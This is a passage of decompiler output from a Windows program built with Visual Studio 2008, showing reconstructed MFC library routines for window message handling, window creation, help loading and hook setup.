{
  HWND__ *pHVar1;
  CWnd *pCVar2;
  
  pHVar1 = *(HWND__ **)(this + 0x38);
  if (pHVar1 == (HWND__ *)0x0) {
    pHVar1 = GetParent(*(HWND *)(this + 0x20));
  }
  pCVar2 = FromHandle(pHVar1);
  return pCVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  public: virtual void * __thiscall CReflectorWnd::`scalar deleting destructor'(unsigned int)
//  public: virtual void * __thiscall CSocketWnd::`scalar deleting destructor'(unsigned int)
//  public: virtual void * __thiscall CWnd::`scalar deleting destructor'(unsigned int)
// 
// Library: Visual Studio 2008 Release

CWnd * __thiscall FID_conflict__scalar_deleting_destructor_(void *this,byte param_1)

{
  CWnd::~CWnd((CWnd *)this);
  if ((param_1 & 1) != 0) {
    FUN_0040a3fc(this);
  }
  return (CWnd *)this;
}



// Library Function - Single Match
//  protected: void __thiscall CWnd::OnDrawItem(int,struct tagDRAWITEMSTRUCT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CWnd::OnDrawItem(CWnd *this,int param_1,tagDRAWITEMSTRUCT *param_2)

{
  int *piVar1;
  int iVar2;
  
  if ((*(int *)param_2 == 1) &&
     (piVar1 = (int *)CMenu::FromHandlePermanent(*(HMENU__ **)(param_2 + 0x14)),
     piVar1 != (int *)0x0)) {
    (**(code **)(*piVar1 + 0xc))(param_2);
    return;
  }
  iVar2 = ReflectLastMsg(*(HWND__ **)(param_2 + 0x14),(long *)0x0);
  if (iVar2 == 0) {
    Default(this);
  }
  return;
}



// Library Function - Single Match
//  protected: int __thiscall CWnd::OnCompareItem(int,struct tagCOMPAREITEMSTRUCT *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

int __thiscall CWnd::OnCompareItem(CWnd *this,int param_1,tagCOMPAREITEMSTRUCT *param_2)

{
  int iVar1;
  
  iVar1 = ReflectLastMsg(*(HWND__ **)(param_2 + 8),(long *)&param_2);
  if (iVar1 == 0) {
    param_2 = (tagCOMPAREITEMSTRUCT *)Default(this);
  }
  return (int)param_2;
}



// Library Function - Single Match
//  protected: void __thiscall CWnd::OnDeleteItem(int,struct tagDELETEITEMSTRUCT *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CWnd::OnDeleteItem(CWnd *this,int param_1,tagDELETEITEMSTRUCT *param_2)

{
  int iVar1;
  
  iVar1 = ReflectLastMsg(*(HWND__ **)(param_2 + 0xc),(long *)0x0);
  if (iVar1 == 0) {
    Default(this);
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  struct HWND__ * __stdcall AfxHtmlHelp(struct HWND__ *,char const *,unsigned int,unsigned long)
//  struct HWND__ * __stdcall AfxHtmlHelp(struct HWND__ *,wchar_t const *,unsigned int,unsigned
// long)
// 
// Library: Visual Studio 2008 Release

undefined4 AfxHtmlHelp(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  CNoTrackObject *pCVar1;
  HINSTANCE__ *hModule;
  undefined4 uVar2;
  FARPROC pFVar3;
  
  AfxLockGlobals(0xc);
  pCVar1 = CProcessLocalObject::GetData
                     ((CProcessLocalObject *)&DAT_00435d00,(_func_CNoTrackObject_ptr *)&LAB_004109b3
                     );
  if (pCVar1 == (CNoTrackObject *)0x0) {
    AfxThrowNotSupportedException();
  }
  if (*(int *)(pCVar1 + 8) == 0) {
    hModule = AfxCtxLoadLibraryA("hhctrl.ocx");
    *(HINSTANCE__ **)(pCVar1 + 4) = hModule;
    if (hModule != (HINSTANCE__ *)0x0) {
      pFVar3 = GetProcAddress(hModule,"HtmlHelpW");
      *(FARPROC *)(pCVar1 + 8) = pFVar3;
      if (pFVar3 != (FARPROC)0x0) goto LAB_004111ab;
      FreeLibrary(*(HMODULE *)(pCVar1 + 4));
      *(undefined4 *)(pCVar1 + 4) = 0;
    }
    uVar2 = 0;
  }
  else {
LAB_004111ab:
    AfxUnlockGlobals(0xc);
    uVar2 = (**(code **)(pCVar1 + 8))(param_1,param_2,param_3,param_4);
  }
  return uVar2;
}



// Library Function - Single Match
//  protected: virtual int __thiscall CWnd::OnCommand(unsigned int,long)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __thiscall CWnd::OnCommand(CWnd *this,uint param_1,long param_2)

{
  CNoTrackObject *pCVar1;
  int iVar2;
  uint uVar3;
  CTestCmdUI local_30 [4];
  uint local_2c;
  int local_8;
  
  uVar3 = param_1 & 0xffff;
  param_1 = param_1 >> 0x10;
  if (param_2 == 0) {
    if (uVar3 == 0) {
      return 0;
    }
    CTestCmdUI::CTestCmdUI(local_30);
    local_2c = uVar3;
    (**(code **)(*(int *)this + 0xc))(uVar3,0xffffffff,local_30,0);
    if (local_8 != 0) {
      param_1 = 0;
LAB_0041124b:
      iVar2 = (**(code **)(*(int *)this + 0xc))(uVar3,param_1,0,0);
      return iVar2;
    }
  }
  else {
    pCVar1 = CThreadLocalObject::GetData
                       ((CThreadLocalObject *)&DAT_004342f0,
                        (_func_CNoTrackObject_ptr *)&LAB_0040a5ef);
    if (pCVar1 == (CNoTrackObject *)0x0) {
      AfxThrowNotSupportedException();
    }
    if ((*(int *)(pCVar1 + 0x13c) != *(int *)(this + 0x20)) &&
       (iVar2 = ReflectLastMsg((HWND__ *)param_2,(long *)0x0), iVar2 == 0)) {
      if (uVar3 == 0) {
        return 0;
      }
      goto LAB_0041124b;
    }
  }
  return 1;
}



// Library Function - Single Match
//  protected: virtual int __thiscall CWnd::OnNotify(unsigned int,long,long *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __thiscall CWnd::OnNotify(CWnd *this,uint param_1,long param_2,long *param_3)

{
  HWND hWnd;
  uint uVar1;
  CNoTrackObject *pCVar2;
  int iVar3;
  long *local_10;
  long local_c;
  int local_8;
  
  hWnd = *(HWND *)param_2;
  local_8 = GetDlgCtrlID(hWnd);
  uVar1 = *(uint *)(param_2 + 8);
  pCVar2 = CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  if (pCVar2 == (CNoTrackObject *)0x0) {
    AfxThrowNotSupportedException();
  }
  if ((*(int *)(pCVar2 + 0x13c) != *(int *)(this + 0x20)) &&
     (iVar3 = ReflectLastMsg(hWnd,param_3), iVar3 == 0)) {
    local_10 = param_3;
    local_c = param_2;
    iVar3 = (**(code **)(*(int *)this + 0xc))(local_8,uVar1 & 0xffff | 0x4e0000,&local_10,0);
    return iVar3;
  }
  return 1;
}



// Library Function - Single Match
//  struct HWND__ * __stdcall AfxGetParentOwner(struct HWND__ *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

HWND__ * AfxGetParentOwner(HWND__ *param_1)

{
  CWnd *this;
  HWND__ *pHVar1;
  uint uVar2;
  
  this = CWnd::FromHandlePermanent(param_1);
  if (this == (CWnd *)0x0) {
    uVar2 = GetWindowLongW(param_1,-0x10);
    if ((uVar2 & 0x40000000) == 0) {
      pHVar1 = GetWindow(param_1,4);
    }
    else {
      pHVar1 = GetParent(param_1);
    }
  }
  else {
    pHVar1 = (HWND__ *)CWnd::GetOwner(this);
    if (pHVar1 != (HWND__ *)0x0) {
      pHVar1 = (HWND__ *)pHVar1[8].unused;
    }
  }
  return pHVar1;
}



// Library Function - Single Match
//  public: class CWnd * __thiscall CWnd::GetTopLevelParent(void)const 
// 
// Library: Visual Studio 2008 Release

CWnd * __thiscall CWnd::GetTopLevelParent(CWnd *this)

{
  HWND__ *pHVar1;
  CWnd *pCVar2;
  HWND__ *pHVar3;
  
  if ((this != (CWnd *)0x0) &&
     (pHVar1 = *(HWND__ **)(this + 0x20), *(HWND__ **)(this + 0x20) != (HWND__ *)0x0)) {
    do {
      pHVar3 = pHVar1;
      pHVar1 = AfxGetParentOwner(pHVar3);
    } while (pHVar1 != (HWND__ *)0x0);
    pCVar2 = FromHandle(pHVar3);
    return pCVar2;
  }
  return (CWnd *)0x0;
}



// Library Function - Single Match
//  protected: void __thiscall CWnd::OnDevModeChange(wchar_t *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __thiscall CWnd::OnDevModeChange(CWnd *this,wchar_t *param_1)

{
  CWinApp *this_00;
  AFX_MODULE_STATE *pAVar1;
  ulong uVar2;
  tagMSG *ptVar3;
  
  pAVar1 = AfxGetModuleState();
  this_00 = *(CWinApp **)(pAVar1 + 4);
  if ((this_00 != (CWinApp *)0x0) && (*(CWnd **)(this_00 + 0x20) == this)) {
    CWinApp::DevModeChange(this_00,param_1);
  }
  uVar2 = GetExStyle(this);
  if ((uVar2 & 0x40000000) == 0) {
    ptVar3 = GetCurrentMessage();
    SendMessageToDescendants
              (*(HWND__ **)(this + 0x20),ptVar3->message,ptVar3->wParam,ptVar3->lParam,1,1);
  }
  return;
}



// WARNING: Function: __EH_prolog3_catch replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

undefined4 FUN_00411436(undefined4 *param_1)

{
  CMFCComObject<class_ATL::CAccessibleProxy> *this;
  undefined4 uVar1;
  
  if (param_1 == (undefined4 *)0x0) {
    return 0x80004003;
  }
  *param_1 = 0;
  this = (CMFCComObject<class_ATL::CAccessibleProxy> *)operator_new(0x18);
  if (this != (CMFCComObject<class_ATL::CAccessibleProxy> *)0x0) {
    CMFCComObject<class_ATL::CAccessibleProxy>::CMFCComObject<class_ATL::CAccessibleProxy>
              (this,(void *)0x0);
    uVar1 = FUN_00411494();
    return uVar1;
  }
  uVar1 = FUN_00411494();
  return uVar1;
}



undefined * Catch_0041147f(void)

{
  int unaff_EBP;
  
  FUN_0040a4cb(*(int **)(unaff_EBP + -0x20));
  return &DAT_0041148d;
}



// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3

undefined4 FUN_00411494(void)

{
  int in_EAX;
  int unaff_EBP;
  int *unaff_ESI;
  int unaff_EDI;
  
  if (in_EAX != unaff_EDI) {
    *(int *)(unaff_EBP + -0x14) = unaff_EDI;
  }
  *unaff_ESI = in_EAX;
  return *(undefined4 *)(unaff_EBP + -0x14);
}



// Library Function - Single Match
//  void __stdcall _AfxHandleActivate(class CWnd *,unsigned int,class CWnd *)
// 
// Library: Visual Studio 2008 Release

void _AfxHandleActivate(CWnd *param_1,uint param_2,CWnd *param_3)

{
  ulong uVar1;
  CWnd *pCVar2;
  BOOL BVar3;
  CWnd *pCVar4;
  undefined4 local_c;
  undefined4 local_8;
  
  uVar1 = CWnd::GetExStyle(param_1);
  if ((((uVar1 & 0x40000000) == 0) &&
      (pCVar2 = CWnd::GetTopLevelParent(param_1), pCVar2 != (CWnd *)0x0)) &&
     ((param_3 == (CWnd *)0x0 ||
      ((BVar3 = IsWindow(*(HWND *)(param_3 + 0x20)), BVar3 == 0 ||
       (pCVar4 = CWnd::GetTopLevelParent(param_3), pCVar2 != pCVar4)))))) {
    local_c = *(undefined4 *)(param_1 + 0x20);
    if (param_3 == (CWnd *)0x0) {
      local_8 = 0;
    }
    else {
      local_8 = *(undefined4 *)(param_3 + 0x20);
    }
    SendMessageW(*(HWND *)(pCVar2 + 0x20),0x36e,param_2,(LPARAM)&local_c);
  }
  return;
}



// Library Function - Single Match
//  int __stdcall _AfxHandleSetCursor(class CWnd *,unsigned int,unsigned int)
// 
// Library: Visual Studio 2008 Release

int _AfxHandleSetCursor(CWnd *param_1,uint param_2,uint param_3)

{
  CWnd *pCVar1;
  HWND pHVar2;
  CWnd *pCVar3;
  int iVar4;
  
  if (((param_2 == 0xfffffffe) && (((param_3 == 0x201 || (param_3 == 0x207)) || (param_3 == 0x204)))
      ) && (pCVar1 = CWnd::GetTopLevelParent(param_1), pCVar1 != (CWnd *)0x0)) {
    pHVar2 = GetLastActivePopup(*(HWND *)(pCVar1 + 0x20));
    pCVar1 = CWnd::FromHandle(pHVar2);
    if (pCVar1 != (CWnd *)0x0) {
      pHVar2 = GetForegroundWindow();
      pCVar3 = CWnd::FromHandle(pHVar2);
      if ((pCVar1 != pCVar3) && (iVar4 = CWnd::IsWindowEnabled(pCVar1), iVar4 != 0)) {
        SetForegroundWindow(*(HWND *)(pCVar1 + 0x20));
        return 1;
      }
    }
  }
  return 0;
}



undefined * Catch_004116aa(void)

{
  long lVar1;
  int unaff_EBP;
  
  *(undefined4 *)(unaff_EBP + -0x4c) = *(undefined4 *)(unaff_EBP + 8);
  *(undefined4 *)(unaff_EBP + -0x48) = *(undefined4 *)(unaff_EBP + 0xc);
  *(undefined4 *)(unaff_EBP + -0x44) = *(undefined4 *)(unaff_EBP + 0x10);
  *(undefined4 *)(unaff_EBP + -0x40) = *(undefined4 *)(unaff_EBP + 0x14);
  lVar1 = AfxProcessWndProcException
                    (*(CException **)(unaff_EBP + -0x1c),(tagMSG *)(unaff_EBP + -0x4c));
  *(long *)(unaff_EBP + -0x14) = lVar1;
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_0040a4cb(*(int **)(unaff_EBP + -0x1c));
  }
  return &LAB_0041161e;
}



// Library Function - Single Match
//  void __stdcall AfxHookWindowCreate(class CWnd *)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void AfxHookWindowCreate(CWnd *param_1)

{
  CNoTrackObject *pCVar1;
  DWORD dwThreadId;
  HHOOK pHVar2;
  
  pCVar1 = CThreadLocalObject::GetData
                     ((CThreadLocalObject *)&DAT_004342f0,(_func_CNoTrackObject_ptr *)&LAB_0040a5ef)
  ;
  if (pCVar1 == (CNoTrackObject *)0x0) {
    AfxThrowNotSupportedException();
  }
  if (*(CWnd **)(pCVar1 + 0x14) != param_1) {
    if (*(int *)(pCVar1 + 0x28) == 0) {
      dwThreadId = GetCurrentThreadId();
      pHVar2 = SetWindowsHookExW(5,(HOOKPROC)&LAB_004116e5,(HINSTANCE)0x0,dwThreadId);
      *(HHOOK *)(pCVar1 + 0x28) = pHVar2;
      if (pHVar2 == (HHOOK)0x0) {
        FUN_0040a59b();
      }
    }
    *(CWnd **)(pCVar1 + 0x14) = param_1;
  }
  return;
}



// Library Function - Single Match
//  public: virtual int __thiscall CWnd::CreateEx(unsigned long,wchar_t const *,wchar_t const
// *,unsigned long,int,int,int,int,struct HWND__ *,struct HMENU__ *,void *)
// 
// Library: Visual Studio 2008 Release

int __thiscall
CWnd::CreateEx(CWnd *this,ulong param_1,wchar_t *param_2,wchar_t *param_3,ulong param_4,int param_5,
              int param_6,int param_7,int param_8,HWND__ *param_9,HMENU__ *param_10,void *param_11)

{
  int iVar1;
  AFX_MODULE_STATE *pAVar2;
  uint uVar3;
  HWND pHVar4;
  void *local_34;
  HINSTANCE local_30;
  HMENU__ *local_2c;
  HWND__ *local_28;
  int local_24;
  int local_20;
  int local_1c;
  int local_18;
  ulong local_14;
  wchar_t *local_10;
  wchar_t *local_c;
  ulong local_8;
  
  if (param_3 != (wchar_t *)0x0) {
    iVar1 = AfxIsValidString(param_3,-1);
    if (iVar1 == 0) {
      AfxThrowNotSupportedException();
    }
  }
  local_8 = param_1;
  local_c = param_2;
  local_14 = param_4;
  local_18 = param_5;
  local_1c = param_6;
  local_20 = param_7;
  local_24 = param_8;
  local_28 = param_9;
  local_10 = param_3;
  local_2c = param_10;
  pAVar2 = AfxGetModuleState();
  local_30 = *(HINSTANCE *)(pAVar2 + 8);
  local_34 = param_11;
  iVar1 = (**(code **)(*(int *)this + 100))(&local_34);
  if (iVar1 == 0) {
    (**(code **)(*(int *)this + 0x11c))();
    uVar3 = 0;
  }
  else {
    AfxHookWindowCreate(this);
    pHVar4 = FID_conflict_AfxCtxCreateWindowExW
                       (local_8,local_c,local_10,local_14,local_18,local_1c,local_20,local_24,
                        local_28,local_2c,local_30,local_34);
    iVar1 = AfxUnhookWindowCreate();
    if (iVar1 == 0) {
      (**(code **)(*(int *)this + 0x11c))();
    }
    uVar3 = (uint)(pHVar4 != (HWND)0x0);
  }
  return uVar3;
}



// Library Function - Single Match
//  public: void __thiscall CWnd::PrepareForHelp(void)
// 
// Library: Visual Studio 2008 Release

void __thiscall CWnd::PrepareForHelp(CWnd *this)

{
  int iVar1;
  CWnd *pCVar2;
  HWND hWnd;
  
  iVar1 = (**(code **)(*(int *)this + 0x128))();
  if (iVar1 != 0) {
    (**(code **)(*(int *)this + 0x188))();
  }
  SendMessageW(*(HWND *)(this + 0x20),0x1f,0,0);
  SendMessageToDescendants(*(HWND__ **)(this + 0x20),0x1f,0,0,1,1);
  pCVar2 = GetTopLevelParent(this);
  if (pCVar2 == (CWnd *)0x0) {
    AfxThrowNotSupportedException();
  }
  SendMessageW(*(HWND *)(pCVar2 + 0x20),0x1f,0,0);
  SendMessageToDescendants(*(HWND__ **)(pCVar2 + 0x20),0x1f,0,0,1,1);
  hWnd = GetCapture();
  if (hWnd != (HWND)0x0) {
    SendMessageW(hWnd,0x1f,0,0);
  }
  return;
}



// WARNING: Function: __EH_prolog3 replaced with injection: EH_prolog3
// WARNING: Function: __EH_epilog3 replaced with injection: EH_epilog3
// Library Function - Single Match
//  protected: virtual int __thiscall CWnd::OnWndMsg(unsigned int,unsigned int,long,long *)
// 
// Library: Visual Studio 2008 Release

int __thiscall CWnd::OnWndMsg(CWnd *this,uint param_1,uint param_2,long param_3,long *param_4)

{
  undefined4 uVar1;
  int iVar2;
  CWnd *pCVar3;
  code **ppcVar4;
  void *pvVar5;
  CMenu *pCVar6;
  uint uVar7;
  uint uVar8;
  CWnd *pCVar9;
  uint uVar10;
  CMenu *pCVar11;
  AFX_MSGMAP_ENTRY *pAVar12;
  code *pcVar13;
  short sVar14;
  short sVar15;
  CWnd local_80 [32];
  HWND__ *local_60;
  void *local_30;
  undefined4 local_2c;
  undefined4 local_28;
  uint *local_1c;
  undefined4 local_18;
  int local_14 [3];
  undefined4 local_8;
  undefined4 uStack_4;
  
  pCVar6 = (CMenu *)param_3;
  uStack_4 = 0x70;
  local_14[0] = 0;
  local_18 = 0x7fffffff;
  local_8 = 0;
  if (param_1 == 0x111) {
    iVar2 = (**(code **)(*(int *)this + 0xf0))(param_2,param_3);
    if (iVar2 == 0) goto LAB_00411ccc;
    goto LAB_00411afa;
  }
  if (param_1 == 0x4e) {
    if (*(int *)param_3 == 0) goto LAB_00411ccc;
    iVar2 = (**(code **)(*(int *)this + 0xf4))(param_2,param_3,local_14);
    goto joined_r0x00411fa5;
  }
  if (param_1 == 6) {
    pCVar3 = FromHandle((HWND__ *)param_3);
    _AfxHandleActivate(this,param_2,pCVar3);
  }
  sVar14 = (short)param_3;
  if ((param_1 == 0x20) &&
     (iVar2 = _AfxHandleSetCursor(this,(int)sVar14,(uint)param_3 >> 0x10), iVar2 != 0))
  goto LAB_00411afa;
  if ((((*(int *)(this + 0x4c) != 0) && (0 < *(int *)(*(int *)(this + 0x4c) + 0x74))) &&
      ((((0x1ff < param_1 && (param_1 < 0x20a)) || ((0xff < param_1 && (param_1 < 0x110)))) ||
       (param_1 - 0x281 < 0x11)))) &&
     (iVar2 = (**(code **)(**(int **)(this + 0x4c) + 0x94))(param_1,param_2,param_3,local_14),
     iVar2 != 0)) goto switchD_00411c6f_caseD_39;
  ppcVar4 = (code **)(**(code **)(*(int *)this + 0x28))();
  CInternalGlobalLock::Lock((CInternalGlobalLock *)&local_18,7);
  iVar2 = (((uint)ppcVar4 ^ param_1) & 0x1ff) * 0xc;
  local_1c = (uint *)(&DAT_00434370 + iVar2);
  if ((param_1 != *local_1c) || (ppcVar4 != *(code ***)(&DAT_00434378 + iVar2))) {
    *local_1c = param_1;
    *(code ***)(&DAT_00434378 + iVar2) = ppcVar4;
    for (; *ppcVar4 != (code *)0x0; ppcVar4 = (code **)(**ppcVar4)()) {
      if (param_1 < 0xc000) {
        param_3 = (long)AfxFindMessageEntry((AFX_MSGMAP_ENTRY *)ppcVar4[1],param_1,0,0);
        if ((AFX_MSGMAP_ENTRY *)param_3 != (AFX_MSGMAP_ENTRY *)0x0) {
          local_1c[1] = param_3;
          CInternalGlobalLock::Unlock((CInternalGlobalLock *)&local_18);
          goto LAB_00411c5a;
        }
      }
      else {
        pAVar12 = (AFX_MSGMAP_ENTRY *)ppcVar4[1];
        while (param_3 = (long)AfxFindMessageEntry(pAVar12,0xc000,0,0),
              (AFX_MSGMAP_ENTRY *)param_3 != (AFX_MSGMAP_ENTRY *)0x0) {
          if (**(uint **)(param_3 + 0x10) == param_1) {
            local_1c[1] = param_3;
            CInternalGlobalLock::Unlock((CInternalGlobalLock *)&local_18);
            goto LAB_00412050;
          }
          pAVar12 = (AFX_MSGMAP_ENTRY *)(param_3 + 0x18);
        }
      }
    }
    local_1c[1] = 0;
    CInternalGlobalLock::Unlock((CInternalGlobalLock *)&local_18);
    goto LAB_00411ccc;
  }
  param_3 = *(long *)(&DAT_00434374 + iVar2);
  CInternalGlobalLock::Unlock((CInternalGlobalLock *)&local_18);
  if ((AFX_MSGMAP_ENTRY *)param_3 == (AFX_MSGMAP_ENTRY *)0x0) goto LAB_00411ccc;
  if (0xbfff < param_1) {
LAB_00412050:
    pcVar13 = *(code **)(param_3 + 0x14);
    goto LAB_00412057;
  }
LAB_00411c5a:
  pcVar13 = *(code **)(param_3 + 0x14);
  sVar15 = (short)((uint)pCVar6 >> 0x10);
  pCVar3 = (CWnd *)pCVar6;
  switch(*(int *)(param_3 + 0x10)) {
  case 1:
    param_2 = ::FromHandle((void *)param_2);
    goto LAB_00411cfb;
  case 2:
  case 3:
  case 4:
  case 0x1b:
  case 0x1c:
    goto LAB_00411cfb;
  case 5:
  case 0xc:
    pCVar11 = (CMenu *)((uint)pCVar6 >> 0x10);
    pCVar3 = (CWnd *)((uint)pCVar6 & 0xffff);
    pCVar9 = FromHandle((HWND__ *)param_2);
    goto LAB_00411d30;
  case 6:
  case 0x47:
    param_2 = (uint)FromHandle((HWND__ *)param_2);
    goto LAB_00412057;
  case 7:
  case 0xd:
  case 0x4a:
    param_2 = (uint)pCVar6;
LAB_00411cfb:
    local_14[0] = (*pcVar13)(param_2);
    break;
  case 8:
    FUN_00413421(&local_2c);
    local_28 = *(undefined4 *)((int)pCVar6 + 4);
    local_8._0_1_ = 1;
    CWnd(local_80);
    local_60 = *(HWND__ **)pCVar6;
    uVar1 = *(undefined4 *)((int)pCVar6 + 8);
    local_8 = CONCAT31(local_8._1_3_,2);
    pCVar3 = FromHandlePermanent(local_60);
    if (pCVar3 == (CWnd *)0x0) {
      if ((*(int *)(this + 0x4c) != 0) &&
         (pvVar5 = CMapPtrToPtr::GetValueAt((CMapPtrToPtr *)(*(int *)(this + 0x4c) + 0x24),local_60)
         , pvVar5 != (void *)0x0)) {
        local_30 = pvVar5;
      }
      pCVar3 = local_80;
    }
    local_14[0] = (*pcVar13)(&local_2c,pCVar3,uVar1);
    local_28 = 0;
    local_60 = (HWND__ *)0x0;
    local_8 = CONCAT31(local_8._1_3_,1);
    ~CWnd(local_80);
    goto LAB_00411db5;
  case 9:
    FUN_00413421(&local_2c);
    local_28 = *(undefined4 *)((int)pCVar6 + 4);
    local_8 = CONCAT31(local_8._1_3_,3);
    local_14[0] = (*pcVar13)(&local_2c,*(undefined4 *)((int)pCVar6 + 8));
    local_28 = 0;
LAB_00411db5:
    local_8 = local_8 & 0xffffff00;
    CDC::~CDC((CDC *)&local_2c);
    break;
  case 10:
    pCVar11 = (CMenu *)(param_2 >> 0x10);
    pCVar3 = FromHandle((HWND__ *)pCVar6);
    goto LAB_00411df9;
  case 0xb:
    pCVar6 = (CMenu *)(param_2 >> 0x10);
    param_2 = param_2 & 0xffff;
  case 0xe:
  case 0x2f:
  case 0x4f:
    goto LAB_00412057;
  case 0xf:
    pCVar11 = CMenu::FromHandle((HMENU__ *)pCVar6);
    pCVar3 = (CWnd *)(param_2 >> 0x10);
LAB_00411df9:
    pCVar9 = (CWnd *)(param_2 & 0xffff);
LAB_00411d30:
    local_14[0] = (*pcVar13)(pCVar9,pCVar3,pCVar11);
    break;
  case 0x10:
  case 0x12:
  case 0x15:
  case 0x1e:
  case 0x2d:
  case 0x32:
  case 0x4c:
  case 0x53:
    goto LAB_0041203c;
  case 0x11:
  case 0x14:
  case 0x54:
    pCVar6 = (CMenu *)param_2;
    goto LAB_00411e25;
  case 0x13:
    (*pcVar13)();
    break;
  case 0x16:
    pCVar3 = (CWnd *)(param_2 >> 0x10);
    param_2 = param_2 & 0xffff;
    goto LAB_0041203c;
  case 0x17:
    param_2 = (uint)sVar14;
    pCVar3 = (CWnd *)(int)sVar15;
    goto LAB_0041203c;
  case 0x18:
  case 0x19:
    pCVar9 = (CWnd *)((uint)pCVar6 >> 0x10);
    pCVar3 = (CWnd *)((uint)pCVar6 & 0xffff);
    goto LAB_00411e61;
  case 0x1a:
    pCVar3 = FromHandle((HWND__ *)pCVar6);
    goto LAB_0041203c;
  case 0x1d:
  case 0x28:
  case 0x31:
    local_14[0] = (*pcVar13)();
    break;
  case 0x1f:
    pCVar9 = FromHandle((HWND__ *)param_2);
    pCVar3 = FromHandle((HWND__ *)pCVar6);
    param_2 = (uint)((CMenu *)*(int *)(this + 0x20) == pCVar6);
    goto LAB_00411e61;
  case 0x20:
    pCVar6 = (CMenu *)::FromHandle((void *)param_2);
    goto LAB_00411e25;
  case 0x21:
    pCVar6 = CMenu::FromHandle((HMENU__ *)param_2);
    goto LAB_00411e25;
  case 0x22:
    pCVar9 = (CWnd *)(int)sVar15;
    pCVar3 = (CWnd *)(int)sVar14;
    param_2 = (uint)CMenu::FromHandle((HMENU__ *)param_2);
    goto LAB_00411e61;
  case 0x23:
    goto LAB_00411eb2;
  case 0x24:
    param_2 = (uint)pCVar6;
LAB_00411eb2:
    pCVar6 = (CMenu *)FromHandle((HWND__ *)param_2);
    goto LAB_00411e25;
  case 0x25:
    pCVar9 = (CWnd *)((uint)pCVar6 >> 0x10);
    pCVar3 = (CWnd *)((uint)pCVar6 & 0xffff);
    goto LAB_00411ec5;
  case 0x26:
    pCVar3 = (CWnd *)(int)sVar14;
    pCVar9 = (CWnd *)(int)sVar15;
LAB_00411ec5:
    param_2 = (uint)FromHandle((HWND__ *)param_2);
    goto LAB_00411e61;
  case 0x27:
    param_2 = (uint)FromHandle((HWND__ *)param_2);
    pCVar3 = (CWnd *)pCVar6;
    goto LAB_0041203c;
  case 0x29:
    pCVar9 = (CWnd *)(param_2 >> 0x10);
    pCVar3 = FromHandle((HWND__ *)pCVar6);
    goto LAB_00411ef7;
  case 0x2a:
  case 0x2b:
    pCVar11 = (CMenu *)(int)(short)param_2;
    pCVar3 = (CWnd *)(int)(short)(param_2 >> 0x10);
    param_2 = (uint)pCVar11;
    if (*(int *)(param_3 + 0x10) == 0x2a) {
      pCVar9 = FromHandle((HWND__ *)pCVar6);
      goto LAB_00411e61;
    }
    goto LAB_0041203c;
  case 0x2c:
  case 0x33:
LAB_00411e25:
    (*pcVar13)(pCVar6);
    break;
  case 0x2e:
  case 0x36:
  case 0x52:
    (*pcVar13)(param_2,pCVar6);
    goto LAB_00411afa;
  case 0x30:
  case 0x46:
    param_2 = (uint)sVar14;
    pCVar6 = (CMenu *)(int)sVar15;
    goto LAB_00412057;
  case 0x34:
    pCVar3 = (CWnd *)(param_2 >> 0x10);
    pCVar9 = (CWnd *)pCVar6;
LAB_00411ef7:
    param_2 = param_2 & 0xffff;
    goto LAB_00411e61;
  case 0x35:
    pCVar3 = (CWnd *)(int)sVar14;
    pCVar9 = (CWnd *)(int)sVar15;
LAB_00411e61:
    (*pcVar13)(param_2,pCVar3,pCVar9);
    break;
  case 0x37:
    local_14[0] = (*pcVar13)(param_2 & 0xffff,param_2 >> 0x10,(int)sVar14,(int)sVar15);
    iVar2 = local_14[0];
    goto joined_r0x00411fa5;
  case 0x38:
    (*pcVar13)(param_2 & 0xffff,param_2 >> 0x10,(int)sVar14,(int)sVar15);
    break;
  case 0x45:
    local_14[0] = (*pcVar13)();
    iVar2 = local_14[0];
joined_r0x00411fa5:
    if (iVar2 != 0) {
LAB_00411ccc:
      local_8 = 0xffffffff;
      CInternalGlobalLock::Unlock((CInternalGlobalLock *)&local_18);
      return 0;
    }
    break;
  case 0x48:
    pCVar3 = (CWnd *)CMenu::FromHandle((HMENU__ *)pCVar6);
    goto LAB_0041203c;
  case 0x49:
    pCVar6 = CMenu::FromHandle((HMENU__ *)pCVar6);
LAB_00412057:
    local_14[0] = (*pcVar13)(param_2,pCVar6);
    break;
  case 0x4b:
    param_2 = (uint)CMenu::FromHandle((HMENU__ *)param_2);
    pCVar3 = (CWnd *)pCVar6;
    goto LAB_0041203c;
  case 0x4d:
    uVar10 = (uint)pCVar6 & 0xffff;
    uVar7 = (uint)pCVar6 >> 0x10 & 0xf000;
    uVar8 = (uint)pCVar6 >> 0x10 & 0xfff;
    param_2 = (uint)FromHandle((HWND__ *)param_2);
    goto LAB_00411ff6;
  case 0x4e:
    param_2 = param_2 & 0xff;
LAB_0041203c:
    (*pcVar13)(param_2,pCVar3);
    break;
  case 0x50:
    uVar7 = (uint)sVar14;
    uVar10 = (uint)sVar15;
    uVar8 = param_2 >> 0x10;
    param_2 = param_2 & 0xffff;
    goto LAB_00411ff6;
  case 0x51:
    uVar7 = (uint)sVar14;
    uVar10 = (uint)sVar15;
    uVar8 = param_2 >> 0x10;
LAB_00411ff6:
    (*pcVar13)(param_2,uVar8,uVar7,uVar10);
LAB_00411afa:
    local_14[0] = 1;
  }
switchD_00411c6f_caseD_39:
  if (param_4 != (long *)0x0) {
    *param_4 = local_14[0];
  }
  local_8 = 0xffffffff;
  CInternalGlobalLock::Unlock((CInternalGlobalLock *)&local_18);
  return 1;
}



// Library Function - Single Match
